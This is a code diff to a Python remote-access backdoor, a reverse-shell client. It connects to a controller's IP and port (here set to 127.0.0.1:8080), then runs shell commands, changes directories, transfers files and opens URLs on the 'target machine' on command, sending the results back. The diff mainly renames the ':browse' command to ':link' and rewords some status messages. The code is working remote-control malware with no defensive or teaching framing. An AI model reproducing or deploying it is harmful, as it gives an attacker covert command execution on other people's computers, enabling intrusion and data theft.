@@ -1,8 +1,8 @@
 import struct,socket,subprocess,os,platform,webbrowser as browser
 import listen
 #   Change IP to your ip and Port to the listening port
-IP = "" #Here change to your ip
-port = 8080 # And here just put any port
+IP = "127.0.0.1" #Host
+port = 8080 #Port
 class senrev:
     def __init__(self,sock):
         self.sock = sock
@@ -72,8 +72,8 @@ def download(cmd):
       wf.write(data)
      wf.close()
      controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
-def browse(cmd):
-    url = "".join(cmd.split(":browse")).strip()
+def link(cmd):
+    url = "".join(cmd.split(":link")).strip()
     browser.open(url)
 def shell(senrev=senrev):
    global s
@@ -91,7 +91,7 @@ def shell(senrev=senrev):
           s.shutdown(2)
           s.close()
           break
-       elif ":browse" in cmd: browse(cmd)
+       elif ":link" in cmd: link(cmd)
        elif cmd == ":check_internet_connection":
           if cnet() == True: controler.send(b"UP")
           else: controler.send(b"Down")
@@ -104,18 +104,18 @@ def shell(senrev=senrev):
                  else:
                    tmpdir2 = os.getcwd()
                    os.chdir(tmpdir)
-                   controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
+                   controler.send("Back to directory[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
                    tmpdir = tmpdir2
                elif dirc =="--":
                   tmpdir = os.getcwd()
                   os.chdir(mainDIR)
-                  controler.send("Back to first dir[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
+                  controler.send("Back to first directory[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
                else:
                  if not os.path.isdir(dirc): controler.send("error: cd: '{}': No such file or directory on target machine !\n".format(dirc).encode("UTF-8"))
                  else:
                      tmpdir = os.getcwd()
                      os.chdir(dirc)
-                     controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
+                     controler.send("Directory Changed To [ {}/ ]\n".format(dirc).encode("UTF-8"))
        elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
        else:
                cmd_output = runCMD(cmd)
